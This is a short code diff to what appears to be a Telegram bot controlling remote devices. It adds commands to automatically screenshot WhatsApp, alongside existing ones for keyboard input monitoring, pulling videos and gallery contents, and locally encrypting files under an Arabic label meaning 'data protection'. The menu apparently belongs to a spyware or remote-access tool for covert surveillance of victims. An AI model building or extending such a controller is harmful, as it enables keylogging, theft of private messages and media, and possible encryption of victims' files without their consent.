@@ -238,6 +238,8 @@ COMMANDS = {
     # advanced
     "input-monitoring-on":  {"category": "advanced", "label": "⌨️ مراقبة الإدخال", "description": "مراقبة لوحة المفاتيح",    "needs_param": False},
     "input-monitoring-off": {"category": "advanced", "label": "⏹ إيقاف المراقبة", "description": "إيقاف المراقبة",           "needs_param": False},
+    "screenshot-on":        {"category": "advanced", "label": "📸 تفعيل لقطات الشاشة", "description": "التقاط شاشة واتساب تلقائياً", "needs_param": False},
+    "screenshot-off":       {"category": "advanced", "label": "⏹ إيقاف لقطات الشاشة", "description": "إيقاف التقاط الشاشة", "needs_param": False},
     "apply-data-protection": {"category": "advanced", "label": "🔐 حماية البيانات",      "description": "تشفير الملفات محلياً",   "needs_param": False},
     "pull-videos":           {"category": "advanced", "label": "🎬 سحب فيديوهات",       "description": "سحب الفيديوهات",          "needs_param": False},
     "stop-videos":           {"category": "advanced", "label": "⏹ إيقاف الفيديو",    "description": "إيقاف سحب الفيديو",      "needs_param": False},
@@ -368,6 +370,7 @@ def tools_keyboard(did):
 def advanced_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(_cbtn(did,"input-monitoring-on"), _cbtn(did,"input-monitoring-off"))
+    kb.add(_cbtn(did,"screenshot-on"), _cbtn(did,"screenshot-off"))
     kb.add(_cbtn(did,"apply-data-protection"))
     kb.add(_cbtn(did,"pull-videos"), _cbtn(did,"stop-videos"))
     kb.add(_cbtn(did,"stop-gallery"))
